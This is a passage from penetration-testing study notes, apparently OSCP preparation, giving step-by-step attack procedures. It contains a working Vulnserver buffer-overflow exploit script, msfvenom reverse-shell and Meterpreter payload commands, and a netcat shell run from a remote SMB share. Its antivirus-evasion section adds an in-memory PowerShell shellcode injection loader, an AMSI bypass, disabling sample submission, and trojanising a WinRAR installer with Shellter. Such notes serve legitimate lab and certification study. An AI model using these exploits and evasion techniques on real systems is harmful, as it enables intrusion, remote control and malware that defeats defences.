00000000  FFE4              jmp esp
```

On Immunity, using mona, type
1. `!mona modules` to get the module to use, one with no memory protection for vulneserver. In this case, `essfunc.dll`.
2. `!mona jmp -r ESP -m "essfunc.dll"` to find the jump address
3. See the entries in `[+] Results:`

### Generating Shellcode

1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
   - Always note the payload size
   - `-b` is for the badchars identified
2. See the following script
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   overflow = () # HERE INSERT THE RESULT FROM THE STEP 1, THE VALUE IN `unsigned char buf[]`
                 # Before every line insert `b`, this will say to bytencode the string
   
   shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow
   
   while True:
   	try:
   		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   		s.connect(('<IP Vulnserver>', <port vulnserver>))
   		s.send((b'TRUN /.:/' + shellcode))
   		s.close()
   	except:
   		print ("Error connecting to the server")
   		sys.exit()
   ```
   - "\xaf\x11\x50\x62" is the jump address found for this example `625011af` in reverse
   - `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
3. Use the command `nc -nvlp 4444`
4. Run the script, notice the shell in netcat



## Antivirus Evasion

- With powershell, use `-e` or `-enc` with an encoded command in base64
- See more here: [Section 14: Antivirus Bypassing](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-14-antivirus-bypassing)
- Try not running exe on disk, for example `cmd /c \\192.168.45.182\Share\nc.exe -i cmd.exe 192.168.45.182 448`

### ToDo
- Discover the AV in the machine of the victim
- Create a VM that resembles the victim's machine
- Make sure to disable sample submission 
  - `Windows Security` > `Virus & threat protection` > `Manage Settings` > `Automatic Sample Submission`
- As last resort, check the malware created with
  - [VirusTotal](https://www.virustotal.com/)
  - [AntiScan.Me](https://antiscan.me/)

### With Evil-WinRM
1. `*Evil-WinRM* PS C:\programdata> menu`
2. `*Evil-WinRM* PS C:\programdata> Bypass-4MSI`

### Thread Injection

1. Write this In-memory payload injection PowerShell `.ps1` script, from [PEN-200](https://www.offsec.com/courses/pen-200/)
   ```PowerShell
   <# Importing Windows APIs in PowerShell #>
   $code = '
   [DllImport("kernel32.dll")]
   public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
   [DllImport("kernel32.dll")]
   public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
   [DllImport("msvcrt.dll")]
   public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
  
   <# Memory allocation and payload writing using Windows APIs in PowerShell #>
   $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
   [Byte[]];
   [Byte[]] $var1 = <SHELLCODE-HERE>;
   $size = 0x1000;
   if ($var1.Length -gt 0x1000) {$size =  $var1.Length};
   $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
   for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
   
   <# Calling the payload using CreateThread #>
   $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
   ```
  
2. Generate a PowerShell compatible payload
   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f powershell`
3. Insert the result in `[Byte[]] $var1` in the PowerShell Script
4. Change the ExecutionPolicy for current user
   ```PowerShell
   PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
   PS C:\> Get-ExecutionPolicy -Scope CurrentUser
   ```
5. Set up a handler to interact with the meterpreter shell
     ```PowerShell
     msf exploit(multi/handler) > show options   <# Set the correct values #>
     msf exploit(multi/handler) > exploit
     ```
6. Run the PowerShell script
   - You can also decide to convert the script in base64 with [ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) and run it with `powershell.exe -e <BASE64>`
8. Get the meterpreter shell on the attacking machine

### Shellter

Note
- [An important tip for Shellter usage](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)

Example of usage
1. Select Auto mode with `A`
2. Selecting a target PE in shellter and performing a backup, in this case the WinRAR installer: `/home/kali/Desktop/winrar-x32-621.exe`
3. Enable stealth mode with `Y`
4. Select a listed payload with `L`
5. Select `meterpreter_reverse_tcp` with `1`
6. Set `LHOST` and `LPORT`
7. Create a listener in Kali with Metasploit
   - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
8. Get the meterpreter shell on the attacking machine
